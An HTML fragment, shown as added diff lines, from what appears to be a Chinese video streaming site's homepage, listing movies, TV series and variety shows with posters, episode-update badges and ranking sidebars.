+                                                <li><a class="play-img" href="/voddetail/94368.html" title="我们的天空，我们的河" target="_blank"><img src="/upload/vod/20260326-1/625a9bc107425e45616036c074afbcc5.webp" alt="我们的天空，我们的河" /><i></i><em>HD</em></a><b><a href="/voddetail/94368.html" title="我们的天空，我们的河" target="_blank">我们的天空，我们的河..</a></b>
+                            <p>2021-</p>
+                        </li>
+                                            </ul>
+                                    </div>
+            </div>
+            <div class="side">
+                <div class="shot">
+                    <dl class="hitstab">
+                        <dt><a href="/label/top.html" target="_blank">最新电影</a></dt>
+                        <dd><a>日</a></dd>
+                        <dd><a>周</a></dd>
+                        <dd class="sg"><a>月</a></dd>
+                        <dd><a>总</a></dd>
+                    </dl>
+                    <div class="bd">
+                        <ul class="dis">
+                                                        <li><i>1</i><a href="/voddetail/28995.html" title="猫猫逃走了" target="_blank">猫猫逃走了</a><span>10-20</span></li>
+                                                        <li><i>2</i><a href="/voddetail/16556.html" title="血溅红灯区" target="_blank">血溅红灯区</a><span>10-19</span></li>
+                                                        <li><i>3</i><a href="/voddetail/13737.html" title="极速江湖" target="_blank">极速江湖</a><span>10-19</span></li>
+                                                        <li><i>4</i><a href="/voddetail/1535.html" title="遥远的格桑花" target="_blank">遥远的格桑花</a><span>10-18</span></li>
+                                                        <li><i>5</i><a href="/voddetail/81718.html" title="荒岛惊魂1966" target="_blank">荒岛惊魂1966</a><span>10-20</span></li>
+                                                        <li><i>6</i><a href="/voddetail/72162.html" title="邻家兄弟" target="_blank">邻家兄弟</a><span>10-20</span></li>
+                                                        <li><i>7</i><a href="/voddetail/57238.html" title="四角关系2005" target="_blank">四角关系2005</a><span>10-19</span></li>
+                                                        <li><i>8</i><a href="/voddetail/50389.html" title="化外之民" target="_blank">化外之民</a><span>10-19</span></li>
+                                                        <li><i>9</i><a href="/voddetail/47594.html" title="铁雨" target="_blank">铁雨</a><span>10-20</span></li>
+                                                        <li><i>10</i><a href="/voddetail/39821.html" title="漫长的黑夜" target="_blank">漫长的黑夜</a><span>10-20</span></li>
+                                                        <li><i>11</i><a href="/voddetail/21207.html" title="浪涛滚滚" target="_blank">浪涛滚滚</a><span>10-20</span></li>
+                                                        <li><i>12</i><a href="/voddetail/16852.html" title="小美人鱼2018" target="_blank">小美人鱼2018</a><span>10-19</span></li>
+                                                        <li><i>13</i><a href="/voddetail/13148.html" title="双赢" target="_blank">双赢</a><span>10-19</span></li>
+                                                        <li><i>14</i><a href="/voddetail/75292.html" title="占领2018" target="_blank">占领2018</a><span>10-20</span></li>
+                                                        <li><i>15</i><a href="/voddetail/69528.html" title="莱娜" target="_blank">莱娜</a><span>10-20</span></li>
+                                                        <li><i>16</i><a href="/voddetail/46897.html" title="方世玉之千面修罗" target="_blank">方世玉之千面修罗</a><span>10-19</span></li>
+                                                        <li><i>17</i><a href="/voddetail/44440.html" title="最佳拍档2：大显神通" target="_blank">最佳拍档2：大显神通</a><span>10-20</span></li>
+                                                    </ul>
+                                                <ul class="undis">
+                                                        <li><i>1</i><a href="/voddetail/35790.html" title="胜利号" target="_blank">胜利号</a><span>10-20</span></li>
+                                                        <li><i>2</i><a href="/voddetail/22593.html" title="狼人杀" target="_blank">狼人杀</a><span>10-19</span></li>
+                                                        <li><i>3</i><a href="/voddetail/16368.html" title="疗愈心中的伤口剧场版" target="_blank">疗愈心中的伤口剧场版</a><span>10-19</span></li>
+                                                        <li><i>4</i><a href="/voddetail/66529.html" title="天使在人间1987" target="_blank">天使在人间1987</a><span>10-20</span></li>
+                                                        <li><i>5</i><a href="/voddetail/44139.html" title="王牌保镖2" target="_blank">王牌保镖2</a><span>10-20</span></li>
+                                                        <li><i>6</i><a href="/voddetail/41478.html" title="C侦探国语" target="_blank">C侦探国语</a><span>10-19</span></li>
+                                                        <li><i>7</i><a href="/voddetail/27065.html" title="飞来的仙鹤" target="_blank">飞来的仙鹤</a><span>10-19</span></li>
+                                                        <li><i>8</i><a href="/voddetail/19558.html" title="我本是高山" target="_blank">我本是高山</a><span>10-19</span></li>
+                                                        <li><i>9</i><a href="/voddetail/1728.html" title="高高在上2019" target="_blank">高高在上2019</a><span>10-20</span></li>
+                                                        <li><i>10</i><a href="/voddetail/59265.html" title="敏感的新时代杀手" target="_blank">敏感的新时代杀手</a><span>10-19</span></li>
+                                                        <li><i>11</i><a href="/voddetail/52307.html" title="侏罗纪世界2国语" target="_blank">侏罗纪世界2国语</a><span>10-19</span></li>
+                                                        <li><i>12</i><a href="/voddetail/47804.html" title="连环追击" target="_blank">连环追击</a><span>10-20</span></li>
+                                                        <li><i>13</i><a href="/voddetail/39097.html" title="致命赌局" target="_blank">致命赌局</a><span>10-20</span></li>
+                                                        <li><i>14</i><a href="/voddetail/22441.html" title="林家铺子" target="_blank">林家铺子</a><span>10-20</span></li>
+                                                        <li><i>15</i><a href="/voddetail/80295.html" title="子弹横飞百老汇" target="_blank">子弹横飞百老汇</a><span>10-20</span></li>
+                                                        <li><i>16</i><a href="/voddetail/3161.html" title="车票" target="_blank">车票</a><span>10-18</span></li>
+                                                        <li><i>17</i><a href="/voddetail/87463.html" title="女人风情话" target="_blank">女人风情话</a><span>10-20</span></li>
+                                                    </ul>
+                        <ul class="undis">
+                                                        <li><i>1</i><a href="/voddetail/88226.html" title="双截龙" target="_blank">双截龙</a><span>10-20</span></li>
+                                                        <li><i>2</i><a href="/voddetail/81303.html" title="大众情人1932" target="_blank">大众情人1932</a><span>10-20</span></li>
+                                                        <li><i>3</i><a href="/voddetail/61817.html" title="恐怖爆发" target="_blank">恐怖爆发</a><span>10-19</span></li>
+                                                        <li><i>4</i><a href="/voddetail/43929.html" title="第二十二条军规1970" target="_blank">第二十二条军规197</a><span>10-20</span></li>
+                                                        <li><i>5</i><a href="/voddetail/40926.html" title="可怕的奥勒弗" target="_blank">可怕的奥勒弗</a><span>10-20</span></li>
+                                                        <li><i>6</i><a href="/voddetail/39307.html" title="自己的葬礼" target="_blank">自己的葬礼</a><span>10-20</span></li>
+                                                        <li><i>7</i><a href="/voddetail/32616.html" title="克洛伊2009" target="_blank">克洛伊2009</a><span>10-20</span></li>
+                                                        <li><i>8</i><a href="/voddetail/23451.html" title="工夫" target="_blank">工夫</a><span>10-20</span></li>
+                                                        <li><i>9</i><a href="/voddetail/6853.html" title="星光闪烁的夜晚" target="_blank">星光闪烁的夜晚</a><span>10-18</span></li>
+                                                        <li><i>10</i><a href="/voddetail/71899.html" title="瓦尔特保卫萨拉热窝1972" target="_blank">瓦尔特保卫萨拉热窝1</a><span>10-20</span></li>
+                                                        <li><i>11</i><a href="/voddetail/63865.html" title="痴恋聊天" target="_blank">痴恋聊天</a><span>10-20</span></li>
+                                                        <li><i>12</i><a href="/voddetail/21768.html" title="毕业之前说再见" target="_blank">毕业之前说再见</a><span>10-20</span></li>
+                                                        <li><i>13</i><a href="/voddetail/86832.html" title="安娜玛德莲娜" target="_blank">安娜玛德莲娜</a><span>10-20</span></li>
+                                                        <li><i>14</i><a href="/voddetail/62304.html" title="戒指" target="_blank">戒指</a><span>10-19</span></li>
+                                                        <li><i>15</i><a href="/voddetail/58428.html" title="坤蒂拉娜3" target="_blank">坤蒂拉娜3</a><span>10-19</span></li>
+                                                        <li><i>16</i><a href="/voddetail/51626.html" title="大宋断狱神手之陈情伞" target="_blank">大宋断狱神手之陈情伞</a><span>10-19</span></li>
+                                                        <li><i>17</i><a href="/voddetail/38643.html" title="鬼画符" target="_blank">鬼画符</a><span>10-20</span></li>
+                                                    </ul>
+                        <ul class="undis">
+                                                        <li><i>1</i><a href="/voddetail/89589.html" title="求精心切" target="_blank">求精心切</a><span>10-20</span></li>
+                                                        <li><i>2</i><a href="/voddetail/39173.html" title="奇幻森林" target="_blank">奇幻森林</a><span>10-19</span></li>
+                                                        <li><i>3</i><a href="/voddetail/19941.html" title="生于七月四日" target="_blank">生于七月四日</a><span>10-20</span></li>
+                                                        <li><i>4</i><a href="/voddetail/12352.html" title="漂亮朋友1947" target="_blank">漂亮朋友1947</a><span>10-20</span></li>
+                                                        <li><i>5</i><a href="/voddetail/90358.html" title="猎魔人：老鼠盗贼团" target="_blank">猎魔人：老鼠盗贼团</a><span>11-02</span></li>
+                                                        <li><i>6</i><a href="/voddetail/76309.html" title="明子的钢琴" target="_blank">明子的钢琴</a><span>10-20</span></li>
+                                                        <li><i>7</i><a href="/voddetail/40109.html" title="无人查收" target="_blank">无人查收</a><span>10-19</span></li>
+                                                        <li><i>8</i><a href="/voddetail/39412.html" title="纸人回魂" target="_blank">纸人回魂</a><span>10-20</span></li>
+                                                        <li><i>9</i><a href="/voddetail/25854.html" title="摇滚年代" target="_blank">摇滚年代</a><span>10-19</span></li>
+                                                        <li><i>10</i><a href="/voddetail/17273.html" title="美丽的梦想" target="_blank">美丽的梦想</a><span>10-19</span></li>
+                                                        <li><i>11</i><a href="/voddetail/73037.html" title="阿育王国语" target="_blank">阿育王国语</a><span>10-20</span></li>
+                                                        <li><i>12</i><a href="/voddetail/65339.html" title="巨蚊之灾" target="_blank">巨蚊之灾</a><span>10-20</span></li>
+                                                        <li><i>13</i><a href="/voddetail/63376.html" title="流星侠" target="_blank">流星侠</a><span>10-20</span></li>
+                                                        <li><i>14</i><a href="/voddetail/57440.html" title="对手2023" target="_blank">对手2023</a><span>10-19</span></li>
+                                                        <li><i>15</i><a href="/voddetail/48941.html" title="深海危机" target="_blank">深海危机</a><span>10-19</span></li>
+                                                        <li><i>16</i><a href="/voddetail/44836.html" title="开心三响炮" target="_blank">开心三响炮</a><span>10-19</span></li>
+                                                        <li><i>17</i><a href="/voddetail/30271.html" title="长安诡事传" target="_blank">长安诡事传</a><span>10-19</span></li>
+                                                    </ul>
+                                            </div>
+                </div>
+                <!--/shot-->
+            </div>
+            <div class="cr"></div>
+        </div>
+                <div class="box">
+            <div class="content">
+                <div class="title">
+                    <h2><a href="/vodtype/2.html">连续剧</a></h2>
+                    <dl>
+                        <dd><a href="javascript:void(0);">推荐</a></dd>
+                                                <dd><a href="/vodtype/13.html">国产剧</a></dd>
+                                                <dd><a href="/vodtype/14.html">港台剧</a></dd>
+                                                <dd><a href="/vodtype/15.html">日韩剧</a></dd>
+                                                <dd><a href="/vodtype/16.html">欧美剧</a></dd>
+                                            </dl>
+                </div>
+                <div class="bd clearfix">
+                    <ul class="img-list dis clearfix">
+                                                <li><a class="play-img" href="/voddetail/94280.html" title="全知干预视角" target="_blank"><img src="/upload/vod/20260323-1/0fc8ffb794776dd1ad09cffa2058551e.jpg" alt="全知干预视角" /><i></i><em>更新至20260627期</em></a><b><a href="/voddetail/94280.html" title="全知干预视角" target="_blank">全知干预视角..</a></b>
+                            <p>2017-日韩综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96038.html" title="莫离" target="_blank"><img src="/upload/vod/20260609-1/ed620e85f54018fed4a09e0b7c81780c.webp" alt="莫离" /><i></i><em>已完结</em></a><b><a href="/voddetail/96038.html" title="莫离" target="_blank">莫离..</a></b>
+                            <p>2026-国产</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/95875.html" title="新进职员姜会长" target="_blank"><img src="/upload/vod/20260531-1/4fc7fde07359ee782d2d68688d79ec23.webp" alt="新进职员姜会长" /><i></i><em>更新至第10集</em></a><b><a href="/voddetail/95875.html" title="新进职员姜会长" target="_blank">新进职员姜会长..</a></b>
+                            <p>2026-韩国</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96346.html" title="龙之家族第三季" target="_blank"><img src="/upload/vod/20260622-1/7125945ea487e52f1abefe3cdb6490ba.webp" alt="龙之家族第三季" /><i></i><em>更新至第02集</em></a><b><a href="/voddetail/96346.html" title="龙之家族第三季" target="_blank">龙之家族第三季..</a></b>
+                            <p>2026-欧美</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/92928.html" title="给你爱情处方" target="_blank"><img src="/upload/vod/20260201-1/470190885a83062ddf81c2de0d75fecb.webp" alt="给你爱情处方" /><i></i><em>更新至第44集</em></a><b><a href="/voddetail/92928.html" title="给你爱情处方" target="_blank">给你爱情处方..</a></b>
+                            <p>2026-韩国</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/94270.html" title="我家的熊孩子" target="_blank"><img src="/upload/vod/20260323-1/255c0889923ea7eab6c6ebf499834e5e.jpg" alt="我家的熊孩子" /><i></i><em>更新至20260628期</em></a><b><a href="/voddetail/94270.html" title="我家的熊孩子" target="_blank">我家的熊孩子..</a></b>
+                            <p>2016-日韩综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/94276.html" title="两天一夜4" target="_blank"><img src="/upload/vod/20260323-1/01d08dcf9711e64d17ac6065559d44d9.jpg" alt="两天一夜4" /><i></i><em>更新至20260628期</em></a><b><a href="/voddetail/94276.html" title="两天一夜4" target="_blank">两天一夜4..</a></b>
+                            <p>2019-日韩综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96348.html" title="街头餐厅斗士" target="_blank"><img src="/upload/vod/20260622-1/9394ec29e5da32b615d93eabcbc61b87.webp" alt="街头餐厅斗士" /><i></i><em>更新至02期</em></a><b><a href="/voddetail/96348.html" title="街头餐厅斗士" target="_blank">街头餐厅斗士..</a></b>
+                            <p>2026-日韩综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96167.html" title="炽夏" target="_blank"><img src="/upload/vod/20260616-1/9fbc4a8b39f5a8d733253f5a24c4c614.webp" alt="炽夏" /><i></i><em>更新至第24集</em></a><b><a href="/voddetail/96167.html" title="炽夏" target="_blank">炽夏..</a></b>
+                            <p>2026-国产</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96492.html" title="进错门的女人" target="_blank"><img src="/upload/vod/20260626-1/8c73d902da218675f6d43f83d36e4ae3.webp" alt="进错门的女人" /><i></i><em>更新至第12集</em></a><b><a href="/voddetail/96492.html" title="进错门的女人" target="_blank">进错门的女人..</a></b>
+                            <p>2019-国产</p>
+                        </li>
+                                            </ul>
+                                        <ul class="img-list dis clearfix">
+                                                <li><a class="play-img" href="/voddetail/96038.html" title="莫离" target="_blank"><img src="/upload/vod/20260609-1/ed620e85f54018fed4a09e0b7c81780c.webp" alt="莫离" /><i></i><em>已完结</em></a><b><a href="/voddetail/96038.html" title="莫离" target="_blank">莫离..</a></b>
+                            <p>2026-国产</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96167.html" title="炽夏" target="_blank"><img src="/upload/vod/20260616-1/9fbc4a8b39f5a8d733253f5a24c4c614.webp" alt="炽夏" /><i></i><em>更新至第24集</em></a><b><a href="/voddetail/96167.html" title="炽夏" target="_blank">炽夏..</a></b>
+                            <p>2026-国产</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96492.html" title="进错门的女人" target="_blank"><img src="/upload/vod/20260626-1/8c73d902da218675f6d43f83d36e4ae3.webp" alt="进错门的女人" /><i></i><em>更新至第12集</em></a><b><a href="/voddetail/96492.html" title="进错门的女人" target="_blank">进错门的女人..</a></b>
+                            <p>2019-国产</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96451.html" title="大吉中介" target="_blank"><img src="/upload/vod/20260625-1/1a3493b52ef6936f2ee4d856161995a3.jpg" alt="大吉中介" /><i></i><em>更新第14集</em></a><b><a href="/voddetail/96451.html" title="大吉中介" target="_blank">大吉中介..</a></b>
+                            <p>2026-大陆</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96307.html" title="云秀行" target="_blank"><img src="/upload/vod/20260620-1/6e936bcd0cdfdc6b5f9a3458d87c9fea.webp" alt="云秀行" /><i></i><em>更新至第23集</em></a><b><a href="/voddetail/96307.html" title="云秀行" target="_blank">云秀行..</a></b>
+                            <p>2026-国产</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96261.html" title="问心2" target="_blank"><img src="/upload/vod/20260618-1/fee4d0c6bd357afc5d59be7204d008bb.webp" alt="问心2" /><i></i><em>更新至第26集</em></a><b><a href="/voddetail/96261.html" title="问心2" target="_blank">问心2..</a></b>
+                            <p>2026-国产</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96384.html" title="种墨园" target="_blank"><img src="/upload/vod/20260623-1/77be7924b4bd76947a9f0289a35cab69.webp" alt="种墨园" /><i></i><em>更新第08集</em></a><b><a href="/voddetail/96384.html" title="种墨园" target="_blank">种墨园..</a></b>
+                            <p>2026-国产</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96260.html" title="特别输送" target="_blank"><img src="/upload/vod/20260618-1/52af4cb0eb30e84f43cb3401629c3862.jpg" alt="特别输送" /><i></i><em>更新第23集</em></a><b><a href="/voddetail/96260.html" title="特别输送" target="_blank">特别输送..</a></b>
+                            <p>2026-大陆</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96159.html" title="爱情有烟火" target="_blank"><img src="/upload/vod/20260615-1/64a3388e9a7d71671e511e59ae246758.webp" alt="爱情有烟火" /><i></i><em>更新至第30集</em></a><b><a href="/voddetail/96159.html" title="爱情有烟火" target="_blank">爱情有烟火..</a></b>
+                            <p>2026-国产</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96543.html" title="战火英雄" target="_blank"><img src="/upload/vod/20260629-1/938f6660c5946ae6d4b2139ce11785b9.jpg" alt="战火英雄" /><i></i><em>更新第12集</em></a><b><a href="/voddetail/96543.html" title="战火英雄" target="_blank">战火英雄..</a></b>
+                            <p>2017-大陆</p>
+                        </li>
+                                            </ul>
+                                        <ul class="img-list dis clearfix">
+                                                <li><a class="play-img" href="/voddetail/96555.html" title="非份之罪粤语" target="_blank"><img src="/upload/vod/20260629-1/507475763ea3a1e60487edb6fe130aea.webp" alt="非份之罪粤语" /><i></i><em>更新第01集</em></a><b><a href="/voddetail/96555.html" title="非份之罪粤语" target="_blank">非份之罪粤语..</a></b>
+                            <p>2026-香港</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/3352.html" title="百味人生" target="_blank"><img src="/upload/vod/20251018-4/da2438308b721fe95a4ff563b42a89f6.jpg" alt="百味人生" /><i></i><em>更新至第223集</em></a><b><a href="/voddetail/3352.html" title="百味人生" target="_blank">百味人生..</a></b>
+                            <p>2025-台湾</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96566.html" title="非份之罪国语" target="_blank"><img src="/upload/vod/20260629-1/0db7ac51a010db72abdc922a3d80485f.jpg" alt="非份之罪国语" /><i></i><em>更新第01集</em></a><b><a href="/voddetail/96566.html" title="非份之罪国语" target="_blank">非份之罪国语..</a></b>
+                            <p>2026-港澳</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/21126.html" title="爱·回家之开心速递" target="_blank"><img src="/upload/vod/20251019-11/2909a488b5fcf024b18b7e0e23c35e0b.jpg" alt="爱·回家之开心速递" /><i></i><em>更新2839集</em></a><b><a href="/voddetail/21126.html" title="爱·回家之开心速递" target="_blank">爱·回家之开心速递..</a></b>
+                            <p>2017-港澳</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96552.html" title="非份之罪国语" target="_blank"><img src="/upload/vod/20260629-1/e51a00e84360038be51863b49f3f9e5e.webp" alt="非份之罪国语" /><i></i><em>更新至第01集</em></a><b><a href="/voddetail/96552.html" title="非份之罪国语" target="_blank">非份之罪国语..</a></b>
+                            <p>2026-香港</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/3530.html" title="爱·回家之开心速递" target="_blank"><img src="/upload/vod/20251018-4/a89cca4406d6bdd65e549fc073177c7d.jpg" alt="爱·回家之开心速递" /><i></i><em>更新至第2839集</em></a><b><a href="/voddetail/3530.html" title="爱·回家之开心速递" target="_blank">爱·回家之开心速递..</a></b>
+                            <p>2017-香港</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96556.html" title="非份之罪粤语" target="_blank"><img src="/upload/vod/20260629-1/ed6a1750d6d5fafef745f481034774e8.webp" alt="非份之罪粤语" /><i></i><em>更新至第01集</em></a><b><a href="/voddetail/96556.html" title="非份之罪粤语" target="_blank">非份之罪粤语..</a></b>
+                            <p>2026-香港</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96553.html" title="非份之罪国语" target="_blank"><img src="/upload/vod/20260629-1/84ac4079fde3d9572ba0319f2ab5aa7a.webp" alt="非份之罪国语" /><i></i><em>更新至第01集</em></a><b><a href="/voddetail/96553.html" title="非份之罪国语" target="_blank">非份之罪国语..</a></b>
+                            <p>2026-香港</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96080.html" title="阿松与阿暖" target="_blank"><img src="/upload/vod/20260611-1/f14fa44aa4139fe0261889992bef7584.jpg" alt="阿松与阿暖" /><i></i><em>更新第15集</em></a><b><a href="/voddetail/96080.html" title="阿松与阿暖" target="_blank">阿松与阿暖..</a></b>
+                            <p>2026-台湾</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96027.html" title="阿松与阿暖" target="_blank"><img src="/upload/vod/20260608-1/11c7a8aa36ad8c065af7fb0a66077cf0.jpg" alt="阿松与阿暖" /><i></i><em>更新至第15集</em></a><b><a href="/voddetail/96027.html" title="阿松与阿暖" target="_blank">阿松与阿暖..</a></b>
+                            <p>2026-台湾</p>
+                        </li>
+                                            </ul>
+                                        <ul class="img-list dis clearfix">
+                                                <li><a class="play-img" href="/voddetail/94280.html" title="全知干预视角" target="_blank"><img src="/upload/vod/20260323-1/0fc8ffb794776dd1ad09cffa2058551e.jpg" alt="全知干预视角" /><i></i><em>更新至20260627期</em></a><b><a href="/voddetail/94280.html" title="全知干预视角" target="_blank">全知干预视角..</a></b>
+                            <p>2017-日韩综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/95875.html" title="新进职员姜会长" target="_blank"><img src="/upload/vod/20260531-1/4fc7fde07359ee782d2d68688d79ec23.webp" alt="新进职员姜会长" /><i></i><em>更新至第10集</em></a><b><a href="/voddetail/95875.html" title="新进职员姜会长" target="_blank">新进职员姜会长..</a></b>
+                            <p>2026-韩国</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/92928.html" title="给你爱情处方" target="_blank"><img src="/upload/vod/20260201-1/470190885a83062ddf81c2de0d75fecb.webp" alt="给你爱情处方" /><i></i><em>更新至第44集</em></a><b><a href="/voddetail/92928.html" title="给你爱情处方" target="_blank">给你爱情处方..</a></b>
+                            <p>2026-韩国</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/94270.html" title="我家的熊孩子" target="_blank"><img src="/upload/vod/20260323-1/255c0889923ea7eab6c6ebf499834e5e.jpg" alt="我家的熊孩子" /><i></i><em>更新至20260628期</em></a><b><a href="/voddetail/94270.html" title="我家的熊孩子" target="_blank">我家的熊孩子..</a></b>
+                            <p>2016-日韩综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/94276.html" title="两天一夜4" target="_blank"><img src="/upload/vod/20260323-1/01d08dcf9711e64d17ac6065559d44d9.jpg" alt="两天一夜4" /><i></i><em>更新至20260628期</em></a><b><a href="/voddetail/94276.html" title="两天一夜4" target="_blank">两天一夜4..</a></b>
+                            <p>2019-日韩综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96348.html" title="街头餐厅斗士" target="_blank"><img src="/upload/vod/20260622-1/9394ec29e5da32b615d93eabcbc61b87.webp" alt="街头餐厅斗士" /><i></i><em>更新至02期</em></a><b><a href="/voddetail/96348.html" title="街头餐厅斗士" target="_blank">街头餐厅斗士..</a></b>
+                            <p>2026-日韩综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/94466.html" title="风，带有香气" target="_blank"><img src="/upload/vod/20260330-1/68fe33ff94733d209cd5193c79dcee83.webp" alt="风，带有香气" /><i></i><em>更新第66集</em></a><b><a href="/voddetail/94466.html" title="风，带有香气" target="_blank">风，带有香气..</a></b>
+                            <p>2026-</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96363.html" title="明天也要上班！" target="_blank"><img src="/upload/vod/20260623-1/9945d1f79af2d78e9a96d6e241ef07f8.webp" alt="明天也要上班！" /><i></i><em>更新第03集</em></a><b><a href="/voddetail/96363.html" title="明天也要上班！" target="_blank">明天也要上班！..</a></b>
+                            <p>2026-韩国</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/95901.html" title="医到孤岛爱上你" target="_blank"><img src="/upload/vod/20260602-1/a15e0c26d116eb5bdf1e58736d07c405.jpg" alt="医到孤岛爱上你" /><i></i><em>更新第09集</em></a><b><a href="/voddetail/95901.html" title="医到孤岛爱上你" target="_blank">医到孤岛爱上你..</a></b>
+                            <p>2026-韩剧</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/94786.html" title="所爱之人" target="_blank"><img src="/upload/vod/20260409-1/b966cc737c386436edcfa7555f28c1e3.webp" alt="所爱之人" /><i></i><em>更新第11集</em></a><b><a href="/voddetail/94786.html" title="所爱之人" target="_blank">所爱之人..</a></b>
+                            <p>2026-</p>
+                        </li>
+                                            </ul>
+                                        <ul class="img-list dis clearfix">
+                                                <li><a class="play-img" href="/voddetail/96346.html" title="龙之家族第三季" target="_blank"><img src="/upload/vod/20260622-1/7125945ea487e52f1abefe3cdb6490ba.webp" alt="龙之家族第三季" /><i></i><em>更新至第02集</em></a><b><a href="/voddetail/96346.html" title="龙之家族第三季" target="_blank">龙之家族第三季..</a></b>
+                            <p>2026-欧美</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96550.html" title="野探哈莉 第五季" target="_blank"><img src="/upload/vod/20260629-1/a4d7394440694fe05184a77b4b079479.jpg" alt="野探哈莉 第五季" /><i></i><em>更新第02集</em></a><b><a href="/voddetail/96550.html" title="野探哈莉 第五季" target="_blank">野探哈莉 第五季..</a></b>
+                            <p>2026-欧美</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96342.html" title="传奇办公室：中央情报第二季" target="_blank"><img src="/upload/vod/20260621-1/2ab3c790e0b1b6beb94fc2a3dced9892.webp" alt="传奇办公室：中央情报第二季" /><i></i><em>更新至第05集</em></a><b><a href="/voddetail/96342.html" title="传奇办公室：中央情报第二季" target="_blank">传奇办公室：中央情报..</a></b>
+                            <p>2026-欧美</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96313.html" title="爱情岛(美国版) 第八季" target="_blank"><img src="/upload/vod/20260620-1/1584353fdb75f78b0e282a3db1770bb6.jpg" alt="爱情岛(美国版) 第八季" /><i></i><em>更新第23集</em></a><b><a href="/voddetail/96313.html" title="爱情岛(美国版) 第八季" target="_blank">爱情岛(美国版) 第..</a></b>
+                            <p>2026-欧美综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96353.html" title="夜访吸血鬼 第三季" target="_blank"><img src="/upload/vod/20260622-1/280284e601fe3ba063d8c29af5047f0d.jpg" alt="夜访吸血鬼 第三季" /><i></i><em>更新第04集</em></a><b><a href="/voddetail/96353.html" title="夜访吸血鬼 第三季" target="_blank">夜访吸血鬼 第三季..</a></b>
+                            <p>2026-欧美</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/95112.html" title="梦魇绝镇第四季" target="_blank"><img src="/upload/vod/20260419-1/fcd88d0159930db4323faf448c33c889.jpg" alt="梦魇绝镇第四季" /><i></i><em>更新第10集</em></a><b><a href="/voddetail/95112.html" title="梦魇绝镇第四季" target="_blank">梦魇绝镇第四季..</a></b>
+                            <p>2026-欧美</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/95382.html" title="新西兰特工" target="_blank"><img src="/upload/vod/20260503-1/4bc088df670c0688afca79ec034916ab.jpg" alt="新西兰特工" /><i></i><em>更新第06集</em></a><b><a href="/voddetail/95382.html" title="新西兰特工" target="_blank">新西兰特工..</a></b>
+                            <p>2026-欧美</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96130.html" title="骄傲 Proud" target="_blank"><img src="/upload/vod/20260613-1/5cbed861e8c9649a7b71b5d38a89255d.jpg" alt="骄傲 Proud" /><i></i><em>更新第03集</em></a><b><a href="/voddetail/96130.html" title="骄傲 Proud" target="_blank">骄傲 Proud..</a></b>
+                            <p>2026-欧美</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/96280.html" title="中餐厅·南洋拾光季" target="_blank"><img src="/upload/vod/20260619-1/6dddd5b15eba8488b0e84830754cd085.jpg" alt="中餐厅·南洋拾光季" /><i></i><em>更新20260628</em></a><b><a href="/voddetail/96280.html" title="中餐厅·南洋拾光季" target="_blank">中餐厅·南洋拾光季..</a></b>
+                            <p>2026-欧美综艺</p>
+                        </li>
+                                                <li><a class="play-img" href="/voddetail/95999.html" title="吸血鬼莱斯特" target="_blank"><img src="/upload/vod/20260607-1/feb60d5d9bba80201494ad8bc8917091.webp" alt="吸血鬼莱斯特" /><i></i><em>更新至第04集</em></a><b><a href="/voddetail/95999.html" title="吸血鬼莱斯特" target="_blank">吸血鬼莱斯特..</a></b>
+                            <p>2026-欧美</p>
+                        </li>
+                                            </ul>
+                                    </div>
+            </div>
+            <div class="side">
+                <div class="shot">
+                    <dl class="hitstab">
+                        <dt><a href="/label/top.html" target="_blank">最新连续剧</a></dt>
+                        <dd><a>日</a></dd>
+                        <dd><a>周</a></dd>
+                        <dd class="sg"><a>月</a></dd>
+                        <dd><a>总</a></dd>
+                    </dl>
+                    <div class="bd">
+                        <ul class="dis">
+                                                        <li><i>1</i><a href="/voddetail/76032.html" title="盖布瑞案：消逝的小生命第一季" target="_blank">盖布瑞案：消逝的小生</a><span>10-20</span></li>
+                                                        <li><i>2</i><a href="/voddetail/69940.html" title="重启剧组" target="_blank">重启剧组</a><span>10-20</span></li>
